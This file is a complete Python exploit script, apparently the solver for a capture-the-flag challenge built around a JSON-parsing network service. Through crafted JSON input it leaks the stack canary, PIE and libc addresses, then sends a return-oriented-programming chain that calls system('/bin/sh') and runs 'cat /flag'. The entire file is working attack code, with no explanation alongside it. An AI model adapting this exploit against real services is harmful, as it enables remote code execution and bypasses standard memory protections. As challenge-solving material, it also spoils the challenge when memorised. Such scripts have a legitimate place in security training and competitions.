import json
import re
import socket
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
DESCRIPTION = b"D" * 40
LEAK_SUFFIX = b", Description: " + DESCRIPTION
FLAG_PATTERN = re.compile(rb"K17\{[^}\r\n]+\}")

PIE_RETURN_OFFSET = 0x161A
POP_RDI_OFFSET = 0x11E8
LIBC_RETURN_OFFSET = 0x29CA8
SYSTEM_OFFSET = 0x53110
BIN_SH_OFFSET = 0x1A6EA4

# The bytes between the aligned parser stack and libc's startup frame contain
# at most this many non-NUL bytes in the supplied Debian runtime.  Starting
# from the upper bound makes the calibrated leak stop at, or before, the
# target NUL; the short advancement loop then lands on it exactly.
MAX_NONZERO_BYTES = 0x900
PERSISTENT_ZEROS_FILLED = 985


def pack(value: int) -> bytes:
    return struct.pack("<Q", value)


def unpack(data: bytes) -> int:
    return struct.unpack("<Q", data.ljust(8, b"\0"))[0]


def load_endpoint(name: str) -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    if endpoint["protocol"] != "tcp":
        raise ValueError("the main endpoint must use tcp")
    return endpoint


class Tube:
    def __init__(self, host: str, port: int) -> None:
        self.socket = socket.create_connection((host, port), timeout=15)
        self.socket.settimeout(20)
        self.buffer = bytearray()

    def close(self) -> None:
        self.socket.close()

    def send(self, data: bytes) -> None:
        self.socket.sendall(data)

    def recv_until(self, marker: bytes, limit: int = 1_000_000) -> bytes:
        while True:
            position = self.buffer.find(marker)
            if position >= 0:
                end = position + len(marker)
                result = bytes(self.buffer[:end])
                del self.buffer[:end]
                return result
            if len(self.buffer) > limit:
                raise ValueError("response exceeded the expected size")
            chunk = self.socket.recv(65536)
            if not chunk:
                raise EOFError("service closed the connection")
            self.buffer.extend(chunk)

    def recv_flag(self) -> bytes:
        for _ in range(64):
            match = FLAG_PATTERN.search(self.buffer)
            if match:
                return match.group(0)
            chunk = self.socket.recv(65536)
            if not chunk:
                break
            self.buffer.extend(chunk)
        raise EOFError("flag was not returned")


def read_leak(tube: Tube) -> bytes:
    tube.recv_until(b"Key: ")
    response = tube.recv_until(LEAK_SUFFIX)
    return response[: -len(LEAK_SUFFIX)]


def send_completed_pair(tube: Tube, key: bytes) -> bytes:
    tube.send(b'"' + key + b"|" + DESCRIPTION + b'":{},')
    return read_leak(tube)


def exploit_once(host: str, port: int) -> bytes:
    tube = Tube(host, port)
    try:
        tube.recv_until(b"Enter your JSON:\n")

        tube.send(b'{"' + b"!" * 40 + b"ABC|" + DESCRIPTION + b'":{},')
        first = read_leak(tube)
        if len(first) != 62:
            raise ValueError("unfavourable NUL in the initial stack leak")

        canary = unpack(b"\0" + first[41:48])
        wrapper_rbp = unpack(first[48:54])
        root_rbp = wrapper_rbp - 0x10
        pie_return = unpack(first[56:62])
        pie_base = pie_return - PIE_RETURN_OFFSET
        buffer_address = root_rbp - 0x30
        if pie_base & 0xFFF:
            raise ValueError("invalid PIE leak")

        second = send_completed_pair(tube, b"!" * 1024)
        if len(second) < 0x256:
            raise ValueError("short aligned-stack leak")
        original_rbp = unpack(second[0x250:0x255] + b"\x7f")
        aligned_stack = root_rbp + 0x20230
        if (
            not aligned_stack <= original_rbp < aligned_stack + 0x10000
            or original_rbp & 0xF
        ):
            raise ValueError("unfavourable NUL in the original frame pointer")

        libc_slot_offset = original_rbp + 0x18 - buffer_address
        target_length = libc_slot_offset + 6
        zero_count = (
            target_length - MAX_NONZERO_BYTES - PERSISTENT_ZEROS_FILLED
        )
        if zero_count <= 1:
            raise ValueError("invalid calibrated leak length")

        third = send_completed_pair(tube, b"!" * (zero_count - 1) + b"A")
        for _ in range(128):
            if len(third) >= target_length:
                break
            third = send_completed_pair(tube, b"!" * 41 + b"A")
        if len(third) != target_length:
            raise ValueError(
                "could not land on the libc pointer terminator "
                f"({len(third):#x} != {target_length:#x})"
            )

        libc_return = unpack(
            third[libc_slot_offset : libc_slot_offset + 6]
        )
        libc_base = libc_return - LIBC_RETURN_OFFSET
        if libc_base & 0xFFF:
            raise ValueError("unfavourable NUL in the libc leak")

        fake_frame = b"".join(
            (
                pack(canary),
                pack(0),
                pack(pie_base + POP_RDI_OFFSET),
                pack(libc_base + BIN_SH_OFFSET),
                pack(libc_base + SYSTEM_OFFSET),
            )
        )
        if b'"' in fake_frame:
            raise ValueError("a ROP address contains the description terminator")

        payload = b'"a|":{' * 10
        payload += b'"a|' + fake_frame + b'":{'
        payload += b'"a|":{'
        payload += b'"' + b"!" * 40 + b"AH|" + b"E" * 40 + b'":{}}}'
        tube.send(payload + b"cat /flag\n")
        return tube.recv_flag()
    finally:
        tube.close()


def main() -> int:
    try:
        endpoint = load_endpoint("main")
    except (OSError, ValueError, KeyError, StopIteration, json.JSONDecodeError) as error:
        print(f"instance error: {error}", file=sys.stderr)
        return 1

    errors = []
    for _ in range(12):
        try:
            flag = exploit_once(endpoint["host"], endpoint["port"])
            sys.stdout.buffer.write(flag)
            return 0
        except (OSError, EOFError, ValueError, struct.error) as error:
            errors.append(str(error))

    print(f"exploit failed after 12 attempts: {errors[-1]}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
